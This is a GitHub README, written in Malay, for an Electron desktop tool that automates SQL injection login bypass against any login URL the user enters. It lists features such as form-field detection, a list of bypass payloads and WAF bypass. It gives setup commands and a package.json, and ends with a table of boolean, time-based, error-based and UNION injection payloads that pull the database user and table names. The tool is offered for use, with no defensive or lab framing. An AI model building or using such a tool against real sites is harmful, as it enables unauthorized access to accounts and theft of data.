# sqli-electron-gui
-versi GUI untuk SQLi Login Bypass guna Electron 

# Versi Desktop App (Electron)
 - Fungsi	Status
 - Input URL login	✅ Textbox
 - Auto detect form fields	✅
 - Senarai payload bypass	✅ Dropdown / textarea
 - Result response	✅ Output log
 - Snapshot result	✅ Boleh preview dalam tab
 - Simpan HTML	✅ Download butang
 - Multi-target list	⏳ Akan tambah
 - Proxy / header custom	⏳ Akan tambah
 - Bypass WAF	✅ (aktif)
 
 # Struktur Versi Electron GUI
 
- 📁 my-sqli-gui
  - ├── main.js (Electron main process)
  - ├── preload.js
  - ├── index.html
  - ├── renderer.js (frontend logic)
  - ├── assets/
  - └── logic/
    - └── bypass.js (payload handler)


      ## Struktur Projek
         - 📁 sqli-electron-gui/
            - ├── package.json
            - ├── main.js           // Electron Main Process
            - ├── preload.js        // Bridge ke renderer
            - ├── index.html        // GUI Utama
            - ├── renderer.js       // Logik frontend
            - ├── sqli.js           // SQLi form detector & executor
            - └── output/           // Folder untuk simpan snapshot

# ⚙️ LANGKAH 1 – Setup Projek Electron
- mkdir sqli-electron-gui
- cd sqli-electron-gui
  ### Init Projek + Install Electron
  - npm init -y
  - npm install axios cheerio qs electron
  - 
  ### Update package.json
``` json
{
  "name": "sqli-electron-gui",
  "version": "1.0.0",
  "description": "SQLi Login Bypass Tool (Electron GUI)",
  "main": "main.js",
  "scripts": {
    "start": "electron ."
  },
  "author": "bossku",
  "license": "MIT",
  "dependencies": {
    "axios": "^1.6.8",
    "cheerio": "^1.0.0-rc.12",
    "electron": "^27.0.0",
    "qs": "^6.11.2"
  }
}

```
# ⚙️ LANGKAH 2
```bash
npm install
npm start
```



![test](https://github.com/user-attachments/assets/5bb0604a-aac0-4817-ae5c-cde354489451)


#Disable Gpu 

![error](https://github.com/user-attachments/assets/1642b6b0-60d5-45f5-a808-8b06926bd891)

```bash
set ELECTRON_DISABLE_GPU=1
npm start
```
# Update (soon bila stable ) 
```bash
Teknik	Payload contoh	Cara detect
✅ Boolean-Based	' OR 1=1-- vs ' OR 1=2--	Banding HTML
✅ Time-Based	' OR IF(1=1, SLEEP(3), 0)--	Ukur delay response
✅ Error-Based	' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58,97,58), (SELECT user()), CHAR(58,98,58), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x)a)--	Detect error
✅ DIOS	' UNION SELECT null, table_name FROM information_schema.tables--	Extract table
```

![dump](https://github.com/user-attachments/assets/d6942e4c-8e27-415c-b76d-b763c245180d)
